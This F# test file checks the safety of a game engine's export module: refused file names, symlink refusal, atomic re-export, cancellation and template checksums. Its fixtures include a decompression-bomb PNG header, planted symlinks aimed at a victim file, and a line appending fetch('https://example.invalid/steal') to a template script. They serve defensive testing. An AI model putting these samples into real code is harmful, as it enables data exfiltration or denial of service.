/// Export's edge cases: names it can't write, unexpected failures, links in the output folder,
/// OS metadata files, atomic replacement, cancelling, and template files it must check.
module FarmEngine.Export.Tests.ExportSafetyTests

open System
open System.IO
open System.IO.Compression
open System.Threading
open Xunit
open FarmEngine.Authoring
open FarmEngine.Export
open FarmEngine.Export.Tests.Support
open FarmEngine.Schemas

let private both = [ "windows-x64"; "linux-x64" ]

let private named (name: string) =
    starter () |> withExport (fun s -> { s with ExecutableName = Some name; Title = Some "Willow Creek Farm" })

let private target (report: ExportReport) (id: string) = report.Targets |> List.find (fun t -> t.Target = id)

let private export (project: GameProject) (templates: string) (output: string) (targets: string list) =
    Exporter.run (options templates output targets) project

/// A PNG whose header claims `width`×`height` but whose body is one tiny IDAT: a decompression
/// bomb's header, with nothing behind it.
let private bombPng (width: int) (height: int) =
    let big (value: int) = [| byte (value >>> 24); byte (value >>> 16); byte (value >>> 8); byte value |]
    let chunk (kind: string) (data: byte[]) =
        let body = Array.append (Text.Encoding.ASCII.GetBytes kind) data
        let crc =
            body
            |> Array.fold
                (fun (crc: uint32) b ->
                    let mutable c = crc ^^^ uint32 b
                    for _ in 0..7 do
                        c <- if c &&& 1u <> 0u then 0xEDB88320u ^^^ (c >>> 1) else c >>> 1
                    c)
                0xFFFFFFFFu
        Array.concat [ big data.Length; body; big (int (crc ^^^ 0xFFFFFFFFu)) ]
    Array.concat
        [ [| 0x89uy; byte 'P'; byte 'N'; byte 'G'; 13uy; 10uy; 26uy; 10uy |]
          chunk "IHDR" (Array.concat [ big width; big height; [| 8uy; 6uy; 0uy; 0uy; 0uy |] ])
          chunk "IDAT" [| 0x78uy; 0x9Cuy; 3uy; 0uy; 0uy; 0uy; 0uy; 1uy |]
          chunk "IEND" [||] ]

[<Fact>]
let ``long, reserved and clashing executable names are refused before anything is written`` () =
    use dir = new TempDir()
    let templates = fakeTemplates (dir.Sub "templates") "1.0.0-test"
    for name in [ String('x', 100); "licenses"; "Licenses"; "COM1"; "con" ] do
        let report = export (named name) templates (dir.Sub "out") both
        Assert.True(report.Blocked, name)
        Assert.Contains(report.Errors, fun e -> e.StartsWith("export.executableName", StringComparison.Ordinal))
        Assert.False(Directory.Exists(dir.Sub "out"))
    Assert.True(Defaults.executableNameAllowed (String('x', 64)))
    Assert.False(Defaults.executableNameAllowed (String('x', 65)))

[<Fact>]
let ``a name made from the title is always one export can write`` () =
    Assert.Equal("con-game", Defaults.defaultExecutableName "Con")
    Assert.Equal("licenses-game", Defaults.defaultExecutableName "Licenses")
    Assert.Equal("com1-game", Defaults.defaultExecutableName "COM1")
    let long = Defaults.defaultExecutableName (String.replicate 30 "Farm ")
    Assert.True(long.Length <= Defaults.MaxExecutableNameLength)
    Assert.True(Defaults.executableNameAllowed long)
    // The fallback (no name set) goes the same way, and a 64-character name archives fine.
    use dir = new TempDir()
    let project =
        starter ()
        |> withExport (fun s -> { s with ExecutableName = None; Title = Some(String.replicate 30 "Farm ") })
    let report = export project (fakeTemplates (dir.Sub "templates") "1.0.0-test") (dir.Sub "out") both
    Assert.True(report.Ok, Exporter.format report)
    Assert.Equal(long, report.ExecutableName)
    Assert.True(File.Exists (target report "linux-x64").Archive)
    let titled = starter () |> withExport (fun s -> { s with ExecutableName = None; Title = Some "Licenses" })
    Assert.Equal("licenses-game", (Exporter.identity titled).ExecutableName)
    Assert.Empty(fst (Exporter.check titled))

[<Fact>]
let ``an icon that claims a huge image is refused without decoding it`` () =
    let bomb = bombPng 60000 60000
    match Icons.render bomb with
    | Ok _ -> failwith "a 60000×60000 icon must be refused"
    | Error e -> Assert.Contains("60000×60000", e)
    use dir = new TempDir()
    let icon = { asset "art-bomb" (makePng 256 256 false) with DataUrl = dataUrl bomb }
    let project = named "Bomb" |> withAssets [ icon ] |> withExport (fun s -> { s with IconAssetId = Some "art-bomb" })
    let report = export project (fakeTemplates (dir.Sub "templates") "1.0.0-test") (dir.Sub "out") both
    Assert.False(report.Ok)
    Assert.Contains(report.Errors, fun e -> e.Contains "60000×60000")

[<Fact>]
let ``failures fail their own target with a message instead of throwing`` () =
    use dir = new TempDir()
    let templates = fakeTemplates (dir.Sub "templates") "1.0.0-test"
    // A Windows "template" that is a valid manifest over bytes that are not a PE at all.
    writeTemplate templates ExportTarget.WindowsX64 "1.0.0-test" (Text.Encoding.ASCII.GetBytes "MZ but nothing else") |> ignore
    let report = export (named "Willow") templates (dir.Sub "out") both
    Assert.False(report.Ok)
    Assert.False(report.Blocked)
    Assert.StartsWith("Not a usable Windows executable", (target report "windows-x64").Errors.Head)
    Assert.True((target report "linux-x64").Ok)
    // A file where a target's folder goes: that target fails, the others export.
    let output = dir.Sub "blocked"
    Directory.CreateDirectory output |> ignore
    File.WriteAllText(Path.Combine(output, "linux-x64"), "not a folder")
    let blocked = export (named "Willow") (fakeTemplates (dir.Sub "templates2") "1.0.0-test") output both
    Assert.False((target blocked "linux-x64").Ok)
    Assert.NotEmpty((target blocked "linux-x64").Errors)
    Assert.True((target blocked "windows-x64").Ok, Exporter.format blocked)

[<Fact>]
let ``OS metadata files in the game folder don't block a re-export`` () =
    use dir = new TempDir()
    let templates = fakeTemplates (dir.Sub "templates") "1.0.0-test"
    let first = export (named "Willow") templates (dir.Sub "out") both
    Assert.True(first.Ok, Exporter.format first)
    let linux = (target first "linux-x64").Folder
    for name in [ ".DS_Store"; "Thumbs.db"; "desktop.ini"; ".directory" ] do
        File.WriteAllText(Path.Combine(linux, name), "metadata")
    File.WriteAllText(Path.Combine(linux, "licenses", "Thumbs.db"), "metadata")
    let again = export (named "Willow") templates (dir.Sub "out") both
    Assert.True(again.Ok, Exporter.format again)
    // The replaced folder holds exactly the export again.
    Assert.Equal<string list>(
        [ "Willow"; "Willow.desktop"; "Willow.png"; "game.cart"; "licenses/THIRD-PARTY.txt" ],
        readFolder linux |> Map.keys |> List.ofSeq
    )
    Assert.True(Exporter.isOsMetadataFile "sub/.DS_Store")
    Assert.False(Exporter.isOsMetadataFile "notes.txt")

[<Fact>]
let ``a failed re-export leaves the previous export as it was, with no temporary files`` () =
    use dir = new TempDir()
    let templates = fakeTemplates (dir.Sub "templates") "1.0.0-test"
    let output = dir.Sub "out"
    let first = export (named "Willow") templates output [ "linux-x64" ]
    Assert.True(first.Ok, Exporter.format first)
    let folder = (target first "linux-x64").Folder
    let before = readFolder folder
    // The archive's place is taken by a folder: the target fails before anything is replaced.
    File.Delete (target first "linux-x64").Archive
    Directory.CreateDirectory (target first "linux-x64").Archive |> ignore
    let renamed = { named "Willow" with Name = "Changed" } |> withExport (fun s -> { s with Title = Some "Changed Title" })
    let second = export renamed templates output [ "linux-x64" ]
    Assert.False(second.Ok)
    Assert.Contains("is a folder or a link", String.Join(" ", (target second "linux-x64").Errors))
    Assert.Equal<Map<string, byte[]>>(before, readFolder folder)
    let hidden =
        Directory.EnumerateFileSystemEntries(output, ".*", SearchOption.AllDirectories) |> List.ofSeq
    Assert.Empty hidden

[<Fact>]
let ``export does not write through links in the output folder`` () =
    if not (OperatingSystem.IsWindows()) then
        use dir = new TempDir()
        let templates = fakeTemplates (dir.Sub "templates") "1.0.0-test"
        let output = dir.Sub "out"
        let victim = dir.Sub "victim.txt"
        File.WriteAllText(victim, "keep me")
        // A planted link where the game's executable goes.
        let folder = Path.Combine(output, "linux-x64", "Willow")
        Directory.CreateDirectory folder |> ignore
        File.CreateSymbolicLink(Path.Combine(folder, "Willow"), victim) |> ignore
        let report = export (named "Willow") templates output [ "linux-x64" ]
        Assert.Contains("link", String.Join(" ", (target report "linux-x64").Errors))
        Assert.Equal("keep me", File.ReadAllText victim)
        Assert.False(File.GetUnixFileMode(victim).HasFlag UnixFileMode.UserExecute)
        // A linked target folder is refused too.
        let elsewhere = dir.Sub "elsewhere"
        Directory.CreateDirectory elsewhere |> ignore
        Directory.CreateSymbolicLink(Path.Combine(output, "windows-x64"), elsewhere) |> ignore
        let linked = export (named "Willow") templates output [ "windows-x64" ]
        Assert.Contains("is a link", String.Join(" ", (target linked "windows-x64").Errors))
        Assert.Empty(Directory.EnumerateFileSystemEntries elsewhere)
        // So is a link where the archive goes.
        Directory.Delete(Path.Combine(output, "linux-x64"), true)
        File.CreateSymbolicLink(Path.Combine(output, "Willow-linux-x64.tar.gz"), victim) |> ignore
        let archive = export (named "Willow") templates output [ "linux-x64" ]
        Assert.Contains("is a folder or a link", String.Join(" ", (target archive "linux-x64").Errors))
        Assert.Equal("keep me", File.ReadAllText victim)

[<Fact>]
let ``a cancelled export says so and writes nothing`` () =
    use dir = new TempDir()
    use cancel = new CancellationTokenSource()
    cancel.Cancel()
    let report =
        Exporter.runCancellable cancel.Token (options (fakeTemplates (dir.Sub "templates") "1.0.0-test") (dir.Sub "out") both) (named "Willow")
    Assert.True(report.Cancelled)
    Assert.True(report.Blocked)
    Assert.Empty(report.Targets)
    Assert.Contains("Export cancelled", Exporter.format report)
    Assert.Empty(Directory.EnumerateFileSystemEntries(dir.Sub "out"))

[<Fact>]
let ``every web template file is checked, and the checked bytes are the ones exported`` () =
    use dir = new TempDir()
    let templates = fakeTemplates (dir.Sub "templates") "1.0.0-test"
    let web = Path.Combine(templates, "web")
    File.AppendAllText(Path.Combine(web, "game.js"), "fetch('https://example.invalid/steal');\n")
    let tampered = export (named "Willow") templates (dir.Sub "out") [ "web" ]
    Assert.Contains("damaged: game.js does not match its checksum", String.Join(" ", (target tampered "web").Errors))
    // A manifest that only covers the module (an older package.sh) is refused.
    writeTemplate templates ExportTarget.Web "1.0.0-test" (Text.Encoding.UTF8.GetBytes "\000asm fake module") |> ignore
    File.WriteAllText(
        Path.Combine(web, "template.json"),
        sprintf """{ "target": "web", "version": "1.0.0-test", "sha256": "%s" }""" (sha256 (File.ReadAllBytes(Path.Combine(web, "farm_wasm_bg.wasm"))))
    )
    let partial = export (named "Willow") templates (dir.Sub "out") [ "web" ]
    Assert.Contains("has no checksum for THIRD-PARTY.txt", String.Join(" ", (target partial "web").Errors))
    // The template's files are read once: what was checked is what was written.
    writeTemplate templates ExportTarget.Web "1.0.0-test" (Text.Encoding.UTF8.GetBytes "\000asm fake module") |> ignore
    match Templates.find templates ExportTarget.Web "1.0.0-test" with
    | Error e -> failwith e
    | Ok template ->
        File.WriteAllText(Path.Combine(web, "game.js"), "changed after the check\n")
        match Exporter.package (Exporter.identity (named "Willow")) ExportTarget.Web template [||] (Icons.render (makePng 256 256 false) |> Result.defaultWith failwith) "1.0.0-test" with
        | Error e -> failwith e
        | Ok files ->
            let gameJs = files |> List.find (fun f -> f.Path = "game.js")
            Assert.Equal("import init from './farm_wasm.js';\n", Text.Encoding.UTF8.GetString gameJs.Data)

[<Fact>]
let ``the web archive is a flat zip after the atomic write`` () =
    use dir = new TempDir()
    let report = export (named "Willow") (fakeTemplates (dir.Sub "templates") "1.0.0-test") (dir.Sub "out") [ "web" ]
    Assert.True(report.Ok, Exporter.format report)
    use zip = ZipFile.OpenRead (target report "web").Archive
    Assert.Contains(zip.Entries, fun e -> e.FullName = "index.html")
